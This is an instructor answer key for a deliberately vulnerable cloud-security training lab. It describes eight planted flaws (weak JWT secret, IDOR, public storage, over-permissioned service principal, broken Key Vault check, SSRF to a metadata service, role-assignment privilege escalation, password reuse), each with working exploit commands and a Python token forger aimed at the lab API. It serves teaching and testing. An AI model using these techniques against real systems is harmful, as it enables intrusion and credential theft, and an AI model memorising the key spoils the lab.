# VULNERABILITIES.md - Instructor Answer Key

This document is the answer key for CloudGoat-Lite's "Initech Cloud" lab. It lists
every intentional vulnerability, where it lives in the code, how a student would
discover it, how to exploit it, and the real-world Azure/AWS misconfiguration it
maps to. Students should try the lab first ([SCENARIO.md](SCENARIO.md),
[README.md](README.md)) before reading this.

All example requests assume the API is reachable at `http://TARGET:8000`. Replace
`TARGET` with the target host's LAN IP (or `localhost` if testing from the host
itself).

## Suggested attack chain (overview)

```
j.intern (Reader, RG-Intern-Sandbox)
  |
  |-- V2 IDOR: browse resource IDs sequentially -> read RG-Production resources
  |-- V5 broken Key Vault policy: read prod secrets directly, no extra steps
  |-- V1 weak JWT secret: forge a token as ANY user/role, any time
  |
  |-- V3 public storage container -> secrets_backup.txt
  |        |-- leaks Initech-Deploy-Bot client secret --> V4 (over-permissioned SP)
  |        |-- leaks reused legacy password ("Summer2024!") --> V8 (mike.torres)
  |
  |-- V6 SSRF via logo importer -> fake metadata service -> Logo-Importer-Service creds
  |
  \-- V7 privilege escalation: directly call the role-assignment API -> grant Owner
```

Several of these are independent shortcuts to "game over" (full tenant Owner access
or equivalent) - that's intentional. A real environment usually has more than one
way in too.

---

## V1 - Hardcoded/weak JWT signing secret

- **What**: The API signs and verifies JWTs with a hardcoded, easily-guessed secret
  string instead of a securely generated, rotated key.
- **Where**: `backend/app/auth.py`, `JWT_SECRET = "initech-cloud-2024-dev"`.
- **Discovery**: Reading the backend source (as a student eventually will, per this
  project's goals); in a real engagement this is discovered via a leaked repo,
  config dump, decompiled client, or common-secret wordlist/`jwt_tool` brute force
  against a captured token.
- **Exploit**: Forge a token for any user/role without ever authenticating:
  ```python
  import jwt, time
  payload = {
      "sub": "sarah.chen", "principal_id": 1, "principal_type": "user",
      "role": "Owner", "tenant": "initech-cloud",
      "iat": int(time.time()), "exp": int(time.time()) + 3600,
  }
  token = jwt.encode(payload, "initech-cloud-2024-dev", algorithm="HS256")
  ```
  Use the resulting token as `Authorization: Bearer <token>` against any endpoint -
  you are now "sarah.chen", Owner, without her password.
- **Real-world equivalent**: A hardcoded JWT/session-signing key in source, or a
  static App Registration client secret checked into a repo - either lets an
  attacker mint valid credentials without ever compromising a real account.

## V2 - IDOR via sequential resource IDs

- **What**: Resources are keyed by small sequential integers, and the resource
  detail endpoint doesn't check that the resource belongs to the caller's resource
  group/tenant scope.
- **Where**: `backend/app/routers/resources.py`, `GET /api/resources/{resource_id}`.
  Contrast with `GET /api/resources` (list), which correctly scopes to the caller's
  own resource group.
- **Discovery**: Log in as `j.intern`, note the list view only shows
  `RG-Intern-Sandbox` resources with IDs 1-3. Try ID 4, 5, 6... in the dashboard's
  "Go to resource by ID" box or directly against the API.
- **Exploit**:
  ```bash
  curl http://TARGET:8000/api/resources/5 -H "Authorization: Bearer <j.intern token>"
  ```
  Returns `prod-sql-db` in `RG-Production`, which `j.intern` should never see.
- **Real-world equivalent**: Missing object-level authorization on an ARM resource
  ID path (or an AWS ARN) - the caller is authenticated, but the API never checks
  whether *this* caller should see *this specific* object.

## V3 - Public storage container with planted secrets

- **What**: A storage container is configured for public (anonymous) read access
  and contains a plaintext secrets file.
- **Where**: `backend/app/seed_data.py` (`public-assets` container, `public: True`)
  and `backend/app/routers/storage.py`, `GET /api/storage/objects/{object_id}` -
  when the parent container is public, the endpoint returns content with **no
  authentication check at all**.
- **Discovery**: From the Storage page (or `GET /api/storage/accounts/1/containers`),
  note `public-assets` is flagged "Public read access". Browse its objects and view
  `secrets_backup.txt`.
- **Exploit**:
  ```bash
  curl http://TARGET:8000/api/storage/objects/2   # no Authorization header at all
  ```
  Returns the `Initech-Deploy-Bot` client secret and a legacy shared password in
  plaintext.
- **Real-world equivalent**: Azure Blob container "Public read access for blobs
  only" left enabled, or an S3 bucket/object ACL set to public - one of the most
  common real-world cloud misconfigurations, frequently containing exactly this
  kind of secrets dump.

## V4 - Over-permissioned app registration / service principal

- **What**: `Initech-Deploy-Bot` is granted `Contributor` at **subscription** scope
  (the whole tenant) when its stated purpose - pushing builds to production - only
  needs `Contributor` on `RG-Production`.
- **Where**: `backend/app/seed_data.py` (`_seed_app_registrations`,
  `_seed_role_assignments`); visible via `GET /api/iam/app-registrations` and
  `GET /api/iam/role-assignments` on the IAM page.
- **Discovery**: On the IAM page, compare each app registration's stated purpose
  (description column) against its actual `scope`. Deploy-Bot's scope reads
  `subscription`, not `RG-Production` - the same thing a real access review/audit
  would flag.
- **Exploit**: Combine with V3 to get Deploy-Bot's client secret, then mint a token
  as Deploy-Bot and use its subscription-wide Contributor access:
  ```bash
  curl -X POST http://TARGET:8000/api/iam/app-registrations/1/token \
    -H "Content-Type: application/json" \
    -d '{"client_id":"a1b2c3d4-5e6f-7890-a1b2-deploy0000bot","client_secret":"DB_S3cr3t_kj28dHqL!"}'
  # -> use the returned access_token as Deploy-Bot against any resource in any RG
  ```
- **Real-world equivalent**: A CI/CD service principal granted Contributor (or
  Owner) at subscription scope instead of scoped to the one resource group it
  deploys to - extremely common, and a top target once an attacker gets a foothold
  in a build pipeline.

## V5 - Broken Key Vault access policy

- **What**: The Key Vault secrets endpoint is supposed to be Owner-only, but the
  code only checks that the caller has *some* valid token, not that their role is
  `Owner`.
- **Where**: `backend/app/routers/keyvault.py`, `GET /api/keyvault/{vault_id}/secrets`.
- **Discovery**: Log in as `j.intern` (Reader) and simply open the Key Vault page in
  the console - the secrets are right there, no privilege check stopped you.
- **Exploit**:
  ```bash
  curl http://TARGET:8000/api/keyvault/1/secrets -H "Authorization: Bearer <j.intern token>"
  ```
  Returns `sql-admin-password` and `storage-account-key` in plaintext.
- **Real-world equivalent**: An Azure Key Vault access policy (or AWS Secrets
  Manager resource policy) granted to "all authenticated users"/a broad group
  instead of a scoped admin principal - the vault *looks* locked down in the
  console, but the effective policy is much wider than intended.

## V6 - SSRF via the logo importer, reaching a fake instance-metadata service

- **What**: The branding "import logo from URL" feature fetches an
  attacker-supplied URL server-side, with no allowlist and no blocking of
  loopback/link-local addresses, and reflects the response back to the caller.
- **Where**: `backend/app/routers/iam.py`,
  `POST /api/iam/app-registrations/{app_id}/logo`; the target is
  `backend/app/routers/metadata.py`, `GET /internal/metadata/instance` - modeled on
  real cloud instance metadata services (Azure IMDS / AWS IMDS at
  `169.254.169.254`), which by design require no authentication and are only
  reachable from within the instance itself. This endpoint enforces that same
  "loopback only" rule (checks `request.client.host`), so it correctly refuses
  direct requests from another machine - but the backend's *own* outbound fetch in
  the logo importer originates from loopback, so SSRF through it succeeds.
- **Discovery**: On the IAM page, expand "Update logo" for any app registration.
  Try fetching an external URL first (works normally, showing this is a generic
  URL fetcher) then pivot to internal targets.
- **Exploit**:
  ```bash
  curl -X POST http://TARGET:8000/api/iam/app-registrations/3/logo \
    -H "Authorization: Bearer <j.intern token>" -H "Content-Type: application/json" \
    -d '{"url":"http://127.0.0.1:8000/internal/metadata/instance"}'
  ```
  The response body contains the `Initech-Logo-Importer-Service` client secret,
  which can then be exchanged for a token the same way as in V4.
- **Real-world equivalent**: The canonical SSRF-to-credential-theft chain: an app
  with a server-side URL fetch (webhook importer, PDF/image renderer, URL preview
  feature, etc.) that an attacker points at the cloud metadata service to steal the
  instance's/App Service's managed-identity token.

## V7 - Privilege escalation via unauthorized role-assignment endpoint

- **What**: The endpoint that grants role assignments checks that the caller is
  *authenticated* but never checks that they're *authorized* (i.e. already an
  Owner/admin) to grant roles. The UI only renders the "Assign role" form for
  Owner-role users, but that's a client-side convenience, not an access control -
  the API has no such gate.
- **Where**: `backend/app/routers/iam.py`, `POST /api/iam/role-assignments`.
- **Discovery**: As `j.intern`, the "Assign role" panel isn't visible in the IAM
  page (hidden by frontend logic). Inspect the API (via `/docs`, or by reading
  `frontend/src/js/iam.js`) to find the endpoint isn't actually gated, and call it
  directly.
- **Exploit**:
  ```bash
  curl -X POST http://TARGET:8000/api/iam/role-assignments \
    -H "Authorization: Bearer <j.intern token>" -H "Content-Type: application/json" \
    -d '{"principal_type":"user","principal_id":5,"role":"Owner","scope":"subscription"}'
  ```
  `j.intern` (principal_id 5) is now tenant Owner - confirmed via
  `GET /api/iam/users`.
- **Real-world equivalent**: Missing authorization check on
  `Microsoft.Authorization/roleAssignments/write` (Azure) or an overly permissive
  IAM policy allowing `iam:PutRolePolicy`/`iam:AttachUserPolicy`/`sts:AssumeRole`
  with `PassRole` (AWS) - both are classic, real privilege-escalation primitives
  once any foothold exists.

## V8 - Weak entry-point credential and password reuse

- **What**: The intended starting foothold is a low-privilege account with a weak,
  easily-guessed password. Separately, a "legacy shared admin password" found in
  the leaked secrets file (V3) is reused as a real user's actual login password.
- **Where**: `backend/app/seed_data.py` - `j.intern` / `Welcome2024!` (documented in
  README.md as the intended entry point); `mike.torres`'s password is
  `Summer2024!`, identical to the "legacy shared admin password" planted in
  `secrets_backup.txt`.
- **Discovery**: `j.intern`'s credential is handed to the student directly (README)
  as the assessment's starting point, mirroring how a real engagement often starts
  from one known-weak/leaked credential rather than zero access. The password reuse
  is discovered after finding `secrets_backup.txt` (V3) and noticing the "legacy
  shared admin password" note, then trying it against known usernames.
- **Exploit**:
  ```bash
  curl -X POST http://TARGET:8000/api/auth/login -H "Content-Type: application/json" \
    -d '{"username":"mike.torres","password":"Summer2024!"}'
  ```
  Logs in directly as `mike.torres` (Contributor, `RG-Production`) - no token
  forgery or IDOR needed, just credential reuse.
- **Real-world equivalent**: Weak/default passwords on service or junior-staff
  accounts used as an initial foothold, and password reuse between a "break glass"
  credential and a real employee's login - both extremely common findings in
  real-world password spraying and credential-stuffing during engagements.
